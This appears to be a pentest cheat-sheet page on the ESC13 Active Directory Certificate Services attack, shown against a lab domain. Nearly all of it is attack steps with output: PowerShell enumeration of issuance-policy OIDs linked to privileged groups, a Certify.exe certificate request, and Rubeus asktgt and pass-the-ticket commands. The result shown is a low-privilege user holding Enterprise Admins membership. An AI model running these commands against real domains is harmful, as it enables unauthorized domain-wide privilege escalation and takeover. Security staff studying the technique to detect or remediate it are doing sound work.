title: ESC13: Issuance Policy OID Group Links
html:
Conditions: Certificate template has issuance policies with msDS-OIDToGroupLink linking to a privileged AD group. When a user requests this certificate, their resulting Kerberos TGT contains membership in the linked group.

Note

The linked group must be a Universal security group and must be empty.

Enumerate Linked OIDs

$templates = Get-ADObject -Filter 'objectClass -eq "pKICertificateTemplate"' \
    -Properties msPKI-Certificate-Policy \
    -SearchBase "CN=Configuration,DC=<domain>,DC=local"
foreach ($t in $templates) {
    if ($t.'msPKI-Certificate-Policy') {
        # Check msDS-OIDToGroupLink for each policy OID
    }
}
# After enumeration:
Template ESC13Template linked to group: CN=Enterprise Admins,CN=Users,DC=essos,DC=local

Request Certificate

Certify.exe request /ca:<ca-host>\<ca-name> /template:<template>
Certify.exe request /ca:<domain>\<ca> /template:ESC13Template

[*] Current user context : ESSOS\missandei
[*] CA Response          : The certificate has been issued.
[*] Request ID           : 17

Authenticate — TGT Contains Group Membership

Rubeus.exe asktgt /user:<username> /certificate:<username>.pfx /password:mimikatz
Rubeus.exe ptt /ticket:<ticket-b64>
Rubeus.exe asktgt /user:missandei /certificate:esc13.pfx /password:mimikatz
[+] TGT request successful!
# TGT now contains Enterprise Admins group membership!

Rubeus.exe ptt /ticket:doIFujCCBbagAwIBBaEDAgEW...
[+] Ticket successfully imported!

net group "Enterprise Admins" /domain
# missandei now appears as Enterprise Admin
